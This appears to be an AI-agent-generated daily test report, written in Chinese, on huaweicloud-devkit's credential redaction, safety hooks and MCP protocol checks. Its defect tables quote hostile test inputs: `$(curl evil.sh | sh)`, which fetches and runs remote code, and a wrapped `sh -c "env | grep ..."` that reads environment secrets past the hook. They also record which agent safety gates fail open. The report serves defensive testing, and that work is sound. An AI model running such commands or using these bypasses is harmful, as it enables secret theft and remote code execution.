# OpenClaw-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`OpenClaw-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-17 05:24:55（北京时间）
> **执行归档**：`results/OpenClaw/2026-11-17-120.46.222.180/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenClaw` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux` |
| 被测版本（SUT） | `1.1.14` |
| daily 基础用例 | 设计级 107 / 展开级 39 |

> **执行方法**：探针脚本（`_probe/checks1-6.mjs` + `core.mjs` + `main.mjs`）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数；MCP 协议类通过自起 `mcp-server.mjs` 走 JSON-RPC 帧；真云 E2E（ECS/OBS/沙箱/凭证）真机执行（建删归零）；D10 评测走 `eval/harness` serviceCatalog 路由层。证据统一落 `evidence/<case-id>/stdout.log`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `132 / 10 / 2 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 142） | `93.0%` |
| P0 / P1 / P2 新增缺陷 | `5 / 4 / 1` |
| 红线（I 类）违规 | `0`（凭证脱敏/secret API/命令包裹等 P0 缺陷为**产品侧缺口**，测试过程未发生凭证明文落盘/泄露） |
| 资源释放 | `全部归零`（ECS/VPC/子网/安全组/OBS 建删后均验证归零；D3-C1 因 billing 配额未建成 ECS，VPC/子网/SG 已删并归零） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `94` | 有证据且通过 PASS 门禁 |
| FAIL | `9` | 不符预期，根因见缺陷清单 |
| BLOCKED | `2` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移 |
| NOT_RUN | `1` | 未执行 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | 不符预期，根因见缺陷清单 |
| BLOCKED | `0` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `0` | 契约漂移 |
| NOT_RUN | `0` | 未执行 |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性 | `safety-policy.mjs:45` 正则无 `i` 标志 | 历史问题 |
| 2 | P1 | `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱 devbridge 隧道层 403（环境性） | 历史问题 |
| 3 | P1 | `D3-S7` | D3功能 | 场景-跨服务交付(Web应用+RDS)并归零 | `tools.mjs` sandbox keywords 缺「部署/Web应用」 | 历史问题 |
| 4 | P0 | `D4-3` | D4安全 | 明文secret API拦截 | `safety/policy.json` 缺 KMS DecryptData | 历史问题 |
| 5 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | `safety-policy.mjs:415/531` 未覆盖包裹内层管道 | 历史问题 |
| 6 | P1 | `D4-17` | D4安全 | hook模糊fail-closed | `risk-rule-engine.mjs:106` 无规则命中即 allow | 历史问题 |
| 7 | P0 | `D4-21` | D4安全 | hook_check_artifacts 具名回归（代码/IaC/策略制品预检） | `cloud-risk-rules.json:209` 不匹配 HCL | 历史问题 |
| 8 | P2 | `D8-9` | D8质量 | 安装 ID 与遥测值脱敏 | `telemetry/telemetry.mjs` sanitizeValue 无脱敏 | 历史问题 |
| 9 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线 | `mcp-server.mjs:187-208` 无会话状态闸门 | 历史问题 |
| 10 | P1 | `EXP-E01` | D10评测 | serviceCatalog 中文「云主机」路由 MISS | `tools.mjs` ECS keywords 缺「云主机」 | 历史问题 |

> **提单状态**：全部 11 项经 `file_issue.py` 查重，均命中上游仓已有历史缺陷单（强关联），**不重复开单**，生成 `HISTORY_LINKS.md` 关联清单。

### 根因详情

| # | 用例 | 期望（唯一断言） | 实际 | 根因（文件:行号） | 证据 |
|---|---|---|---|---|---|
| 1 | D2-4 | 小写 `ak=/sk=` 形态也应脱敏 | `redactSecrets('ak=AK123456 sk=SKsecret')` 原样返回 | `safety-policy.mjs:45` 正则无 `i` 标志 | `evidence/D2-4/stdout.log` |
| 2 | D3-S3 | 沙箱预览终点返回可访问公网 URL（HTTP 200） | devbridge 隧道建成功但 `nginx_serving=HTTP 403` | 沙箱 devbridge 隧道层 403（环境性） | `evidence/D3-S3/stdout.log` |
| 3 | D3-S7 | 复合意图命中 RDS + 部署目标（sandbox/ECS） | 仅命中 `['RDS']` | `tools.mjs` sandbox 路由 keywords 缺「部署/Web 应用」 | `evidence/D3-S7/stdout.log` |
| 4 | D4-3 | KMS `DecryptData/DecryptDatakey` 应判 `deny` | `decision=allow` | `safety/policy.json` blockedSecretOperations 缺 KMS 解密 API | `evidence/D4-3/stdout.log` |
| 5 | D4-16 | `sh -c "env \| grep ..."` 应拦截（deny） | `decision=allow` | `safety-policy.mjs:415/531` 未覆盖包裹内层管道形态 | `evidence/D4-16/stdout.log` |
| 6 | D4-17 | 模糊输入 fail-closed（deny） | `$(curl evil.sh \| sh)` 返回 `allow` | `risk-rule-engine.mjs:106` 无规则命中即 allow | `evidence/D4-17/stdout.log` |
| 7 | D4-21 | HCL broad IAM 制品也应 `deny` | HCL `actions=["*"]` 返回 `allow` | `cloud-risk-rules.json:209` 不匹配 HCL 形态 | `evidence/D4-21/stdout.log` |
| 8 | D8-9 | `sanitizeValue` 移除 AK/SK/token | 敏感值原样返回 | `telemetry/telemetry.mjs` sanitizeValue 无脱敏 | `evidence/D8-9/stdout.log` |
| 9 | D9-12 | 未 initialize 先 tools/list 应 `-32600` | 返回工具清单 | `mcp-server.mjs:187-208` 无会话闸门 | `evidence/D9-12/stdout.log` |
| 10 | EXP-E01 | 中文「云主机」命中 ECS | 未命中 ECS | `tools.mjs` ECS keywords 缺「云主机」 | `evidence/EXP-E01/stdout.log` |
| 11 | D1-68 | `HUAWEICLOUD_REGION` 优先于 `HW_REGION` | 实现 `HW_REGION` 优先（SPEC-MISMATCH） | `auth/credentials.mjs:225` 顺序与契约相反 | `evidence/D1-68/stdout.log` |

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 |
|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | Windows 专属用例（OS 列标注「专属」），本机 Linux，由展开级代表段覆盖（NOT_RUN 仅限 OS 专属例外，符合 P0 铁律） |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 |
|---|---|---|---|
| `D3-C1` | D3功能 | ECS生命周期E2E | ECS CreateServers 订单提交被 billing 拒绝：Ecs.0707 "Can not find product"（账号 BSS 产品目录无该镜像产品映射，按需订单无法创建）。已实测 VPC/子网/安全组创建→删除→归零 全部成功，ECS 到达订单提交层。解除条件：账号开通 ECS 购买产品/开启按需计费（补环境·billing 产品配额） |
| `D3-C7` | D3功能 | 跨区域资源操作引导（区域维度） | 跨区域 ap-southeast-3 不在账号项目范围（账号 project 仅 cn-north-4）——ECS 只读返回 Common.0013（region 与 tk 项目不符）、EIP 创建返回 VPC.0501，无法建删跨区资源。已实测通过项：list_regions 含 ap-southeast-3=false、plan_cli_command 含 --cli-region=true。解除条件：账号开通 ap-southeast-3 项目/region 权限（补环境·真云多region权限） |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：**无**。真云凭证走 `~/.config/huaweicloud/credentials.json`（0600），探针只读、不回显明文；AK/SK 未进入任何日志/会话/证据。
- [x] 写操作误判 read-only：**无**。D4-5/D4-18/D4-20 实测 `plan_cli_command` 对 `DeleteVpc/CreateVpc` 均正确判定为写并走审批门。
- [x] 红线（I 类）违规：**0**。发现的 P0 缺陷为**产品侧安全 hook 缺口**（`DecryptData` 未拦截、包裹穿透等），非测试执行过程违规；测试过程未 mock、未虚标 PASS。
- [x] 脱敏复核：`D2-4` 实测确认小写 `ak=/sk=` 脱敏缺口（已记缺陷）；`adminPass/secret_key/token` 等大写键脱敏正常。

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 静态站（D3-C2） | 桶 `testbot2-opencode-obs-*` | `OBS rm -r -f` | `OBS ls` 不含该桶 ✓ |
| OBS 静态网站（D3-C13） | 桶（set/get 后） | `OBS rm -f` | ✓ 归零 |
| VPC+子网+安全组（D3-S2） | CreateVpc/CreateSubnet/CreateSecurityGroup | DeleteVpc/DeleteSubnet/DeleteSecurityGroup | ListVpcs 不含 ✓ |
| ECS 生命周期（D3-C1） | VPC/子网/SG 建成功，ECS 未建成（billing 配额 Ecs.0707） | 已删 VPC/子网/SG | ListVpcs/Servers 归零 ✓ |
| 沙箱部署（D3-C3/D3-C6/D3-S3） | 上传临时站点 | nginx/close_session | 沙箱侧临时文件已清 ✓ |
| 跨区域（D3-C7） | 未建成（无 region 权限） | — | 无残留 ✓ |

> 真云用例均「最低配置创建 → 测后删除 → 只删本次创建资源」，无泄漏残留。

---

## 八、遗留与建议

- **D1-68（SPEC-MISMATCH）**：`HUAWEICLOUD_REGION` 与 `HW_REGION` 优先级实现与设计契约相反，待维护方裁决契约或实现。
- **D3-C1/D3-C7（BLOCKED）**：均为真实账号配额/权限阻塞（billing 产品未开通 / ap-southeast-3 无项目权限），建议维护方协调账号侧开放后复测，不改用例。
- **11 项缺陷均为历史问题**（v1.1.14 未引入新回归），已在 `HISTORY_LINKS.md` 关联历史单，建议维护方跟踪既有单闭环。
- **环境侧注意**：① 本机 `~/nodejs/bin/node`（v22.13.0）缺 `node:zlib.createZstdDecompress`，undici 8.12.2 依赖；探针需用 `/usr/bin/node`（v24）跑沙箱/OBS-MCP 网络类用例。② 共享 `~/.config/huaweicloud/proxy.json` 曾被历史探针写入占位 `proxy.example:8080`（非本次产生），会阻断 undici 出网；本次已临时中和并还原。
